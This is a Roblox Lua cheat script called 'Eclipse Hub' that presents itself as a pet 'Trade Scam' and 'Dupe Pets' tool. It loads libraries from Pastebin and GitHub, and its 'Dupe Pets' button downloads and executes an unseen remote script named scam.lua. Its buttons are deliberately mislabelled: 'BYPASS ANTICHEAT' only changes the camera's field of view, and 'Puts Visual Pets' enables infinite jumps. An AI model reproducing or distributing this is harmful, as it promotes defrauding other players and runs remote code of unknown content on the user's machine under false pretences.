local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()

local Window = OrionLib:MakeWindow({Name = "Eclipse Hub", HidePremium = false, IntroText ="by Eclipse", SaveConfig = true, ConfigFolder = "Eclipse Hub"})

OrionLib:MakeNotification({

    Name = "Loading Trade Scam Script",

    Content = "LOADING",

    Image = "rbxassetid://4483345998",

    Time = 5

})

  

local TutTab = Window:MakeTab({

    Name = "Trade Scam",

    Icon = "rbxassetid://4483345998",

    PremiumOnly = false

})

  local Section = TutTab:AddSection({

    Name = "Trade Scam"

})

TutTab:AddButton({

    Name = "Trade Scam",

    Callback = function()

              print("loading please wait")

      local Library = loadstring(game:HttpGet("https://pastebin.com/raw/vff1bQ9F"))()

local Window = Library.CreateLib("EclipseHub", "Ocean")

-- Tabs

local Tab1 = Window:NewTab("TradeScam")

local Tab1Section = Tab1:NewSection("Dont Forget to press *BYPASS*")

-- Buttons/Windows/Idk

Tab1Section:NewButton("Puts Visual Pets from ur inventory", "Enables Inf Jumps", function()

    local InfiniteJumpEnabled = true

game:GetService("UserInputService").JumpRequest:connect(function()

	if InfiniteJumpEnabled then		game:GetService"Players".LocalPlayer.Character:FindFirstChildOfClass'Humanoid':ChangeState("Jumping")

	end

end)

end)

Tab1Section:NewToggle("BYPASS ANTICHEAT", "Changes Fov", function(state)

    if state then

        game.Workspace.CurrentCamera.FieldOfView = 120

    else

        game.Workspace.CurrentCamera.FieldOfView = 80

    end

end)

Tab1Section:NewSlider("/wSPAM", "Sussy Speed", 250, 120, function(v)

    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = v

end)      

    end    

})

TutTab:AddButton({

    Name = "Dupe Pets",

    Callback = function()

              print("loading please wait")

loadstring(game:HttpGet("https://raw.githubusercontent.com/WhoAsked9/scriptpsx/main/scam.lua"))()

    end

    

})

  OrionLib:Init()
